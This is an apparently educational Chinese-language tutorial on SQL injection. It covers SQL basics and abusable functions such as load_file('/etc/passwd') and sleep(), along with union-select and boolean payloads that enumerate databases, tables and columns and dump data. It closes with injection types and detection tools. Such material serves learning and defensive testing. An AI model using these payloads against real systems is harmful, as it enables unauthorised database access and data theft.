## 一、SQL注入概述

1. SQL注入是一种网络攻击手段，它可以在用户输入的字符串中加入恶意的SQL语句，从而执行计划外的命令或访问未被授权的数据。SQL注入可以绕过应用程序的安全措施，控制数据库服务器，篡改或删除数据库中的记录。
2. SQL注入是由于程序开发过程中不注意规范书写SQL语句和对特殊字符进行过滤，导致用户输入的字符串中的SQL语句被数据库服务器误认为是正常的SQL语句而执行。SQL注入也可能是由于使用了字符串拼接的方式构造SQL语句，而没有使用参数化查询。

## 二、SQL基础操作语法

1.  学习SQL注入需要一定的SQL语言基础，了解常用的SQL语句和函数，以及数据库的结构和操作。 
2.  **_常用的SQL语句_**有以下几种： 
   - 查询：使用SELECT语句从表中选取数据，可以指定要查询的列名、条件、排序等。例如：
```sql
SELECT * FROM person WHERE age > 18 ORDER BY name;
```

   - 增加：使用INSERT INTO语句向表中插入新的行，可以指定要插入的列名和值。例如：
```sql
INSERT INTO person (id, name, age, gender) VALUES (1, 'sam', 20, '男');
```

   - 删除：使用DELETE语句删除表中的行，可以指定要删除的条件。例如：
```sql
DELETE FROM person WHERE id = 1;
```

   - 修改：使用UPDATE语句修改表中的数据，可以指定要修改的列名和值，以及修改的条件。例如：
```sql
UPDATE person SET age = 21 WHERE id = 1;
```

3.  常用的SQL函数有以下几类： 
   - 数值型函数：用于对数值进行计算或转换，比如ABS、ROUND、FLOOR、CEIL、POWER、SQRT、SIN、COS、LOG等。
   - 字符串型函数：用于对字符串进行操作或处理，比如CONCAT、SUBSTRING、LENGTH、REPLACE、TRIM、UPPER、LOWER、REVERSE等。
   - 日期时间函数：用于对日期和时间进行格式化或计算，比如CURDATE、CURTIME、NOW、DATE_FORMAT、DATE_ADD、DATE_SUB、DATEDIFF、TIMEDIFF等。
   - 聚合函数：用于对一组值进行统计或分析，比如SUM、AVG、MIN、MAX、COUNT、DISTINCT、GROUP_CONCAT等。
   - 窗口函数：用于对分组后的数据进行排序或计算，比如ROW_NUMBER、RANK、DENSE_RANK、NTILE、LAG、LEAD、FIRST_VALUE、LAST_VALUE等。
4.  **_MySQL的information_schema_**。information_schema是MySQL的一个特殊数据库，它提供了关于MySQL服务器的元数据信息，例如数据库或表的名称，列的数据类型，或访问权限等。有时这些信息也被称为数据字典或系统目录。你可以使用标准的SQL语句来查询information_schema中的表，以获取元数据信息。在SQL注入中，通常可以利用该库查询其他库中的数据 
```sql
SELECT TABLE_NAME, TABLE_TYPE
FROM information_schema.TABLES;
```
 

## 三、SQL注入常用函数和语句

1.  **_SQL注入中常用的函数_**。SQL注入是一种利用SQL语句中的漏洞，向数据库发送恶意的SQL命令，从而获取敏感信息或执行非法操作的攻击技术。SQL注入中常用的函数有以下几种： 
   - database()：该函数可以显示当前正在使用的数据库库名。例如：
```sql
SELECT database();
```

   - substring()：该函数可以从指定的字段中提取出字段的内容。例如：
```sql
SELECT substring('hello', 1, 2); -- 返回 'he'
SELECT substring(name, 1, 2) FROM person; -- 返回 person 表中 name 列的前两个字符
```

   - length()：该函数可以返回指定字符串或字段的长度。例如：
```sql
SELECT length('hello'); -- 返回 5
SELECT length(name) FROM person; -- 返回 person 表中 name 列的长度
```

   - concat()：该函数可以将多个字符串或字段连接起来。例如：
```sql
SELECT concat('hello', 'world'); -- 返回 'helloworld'
SELECT concat(name, age) FROM person; -- 返回 person 表中 name 列和 age 列的连接
```

   - group_concat()：该函数可以将一组值连接起来，常用于分组查询。例如：
```sql
SELECT gender, group_concat(name) FROM person GROUP BY gender; -- 返回 person 表中按性别分组的姓名列表
```

   - hex()：该函数可以将字符串或数字转换为十六进制。例如：
```sql
SELECT hex('hello'); -- 返回 '68656C6C6F'
SELECT hex(123); -- 返回 '7B'
```

   - unhex()：该函数可以将十六进制转换为字符串或数字。例如：
```sql
SELECT unhex('68656C6C6F'); -- 返回 'hello'
SELECT unhex('7B'); -- 返回 123
```

   - load_file()：该函数可以读取指定文件的内容。例如：
```sql
SELECT load_file('/etc/passwd'); -- 返回 /etc/passwd 文件的内容
```

   - user()：该函数可以返回当前数据库连接使用的用户。例如：
```sql
SELECT user(); -- 返回 'root@localhost'
```

   - version()：该函数可以返回当前数据库的版本。例如：
```sql
SELECT version(); -- 返回 '8.0.26'
```

   - sleep()：该函数可以使数据库暂停指定的秒数。例如：
```sql
SELECT sleep(5); -- 使数据库暂停 5 秒
```

   - floor()：该函数可以返回不大于指定数值的最大整数。例如：
```sql
SELECT floor(3.14); -- 返回 3
```

   - rand()：该函数可以返回一个随机数。例如：
```sql
SELECT rand(); -- 返回 0.123456
```

2.  **_SQL注入中的常用语句_** 
   -  判断有无注入点：在URL或表单中输入如下语句，看页面是否有变化。 
```sql
' and 1=1
#或
' and 1=2
```
 

   -  猜测表名：在URL或表单中输入如下语句，看是否存在admin这张表。 
```sql
and 0<> (select count (*) from *)
#或
and 0<> (select count (*) from admin)
```
 

   -  获取数据库版本：在URL或表单中输入如下语句，看是否能显示数据库版本。 
```sql
and 1= (select @@VERSION)
#或
and 1= (select version())
```
 

   -  获取数据库名：在URL或表单中输入如下语句，看是否能显示数据库名。 
```sql
and 1= (select db_name ())
#或
and 1= (select database())
```
 

   -  获取表名：在URL或表单中输入如下语句，看是否能显示表名。 
```sql
and 1= (select top 1 name from sysobjects where xtype='U')
#或
and 1= (select table_name from information_schema.tables limit 1)
```
 

   -  获取列名：在URL或表单中输入如下语句，看是否能显示列名。 
```sql
and 1= (select top 1 name from syscolumns where id=object_id('表名')
#或
and 1= (select column_name from information_schema.columns where table_name='表名'limit 1)
```
 

   -  获取数据：在URL或表单中输入如下语句，看是否能显示数据。 
```sql
and 1= (select top 1 列名 from 表名)
#或
and 1= (select 列名 from 表名 limit 1)
```
 
## 四、SQL注入中的常用命令

   1.  SQL注入中的常用命令示例： 
      -  查看当前用户 
```sql
union select 1, (select user ())–+
```
 

      -  查看数据库版本 
```sql
union select 1, (select version ())–+
```
 

      -  查看当前数据库名 
```sql
union select 1, (select database ())–+
```
 

      -  查看所有数据库名 
```sql
union select 1, (select group_concat (schema_name) from information_schema.schemata)–+
```
 

      -  查看某个数据库的所有表名 
```sql
union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='数据库名')–+
```
 

      -  查看某个表的所有列名 
```sql
union select 1, (select group_concat (column_name) from information_schema.columns where table_name='表名')–+
```
 

      -  查看某个列的所有数据 
```sql
union select 1, (select group_concat (列名) from 表名)–+
```
 

## 五、SQL注入的类别

1. SQL注入的种类有以下几种： 
   - 联合注入：可以使用union的情况下的注入。
   - 布尔盲注：不能根据页面返回内容判断任何信息，只能根据条件真假来判断。
   - 报错注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
   - 时间盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。
   - 堆叠注入：可以同时执行多条语句的执行时的注入。
   - 二次注入：在数据库中存储了用户的输入，再次执行时触发的注入。
   - 宽字节注入：利用字符编码的差异，绕过过滤的注入。
   - Cookie注入：利用Cookie中的参数进行注入

## 六、SQL注入常用的检测方法

1. SQL注入常用的检测方法有以下几种： 
   - 动态检测：通过向数据库发送特殊的SQL语句，观察数据库的响应，判断是否存在SQL注入漏洞。
   - 静态检测：通过分析程序源代码，找出可能存在SQL注入风险的语句，进行修复或优化。
   - 插入单、双引号：通过在参数中添加单引号或双引号，看是否出现数据库错误提示，判断是否有注入点。
   - 使用SQL注入检测工具：例如SQLMap、SQLNinja、Havij等，可以自动化地发现和利用SQL注入漏洞
